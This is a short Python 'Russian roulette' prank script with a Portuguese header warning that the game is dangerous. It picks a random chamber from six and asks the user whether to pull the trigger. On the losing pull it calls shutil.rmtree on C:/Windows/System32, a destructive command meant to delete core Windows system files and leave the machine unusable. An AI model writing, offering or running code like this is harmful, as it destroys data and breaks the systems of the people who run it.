#
#
#ESSA BRINCADEIRA É PERIGOSA!
#
#
import shutil
from random import randint

tiro = randint(1,6)
tambor = [1,2,3,4,5,6]

for i in tambor:
    gatilho = str(input("Gatilho: Puxar ou NÃO?")).lower()
    if 'p' in gatilho:
        if i == tiro:
            shutil.rmtree("C:/Windows/System32")
            break
        else:
            print("Nada aconteceu")
    if gatilho in 'n':
        break
    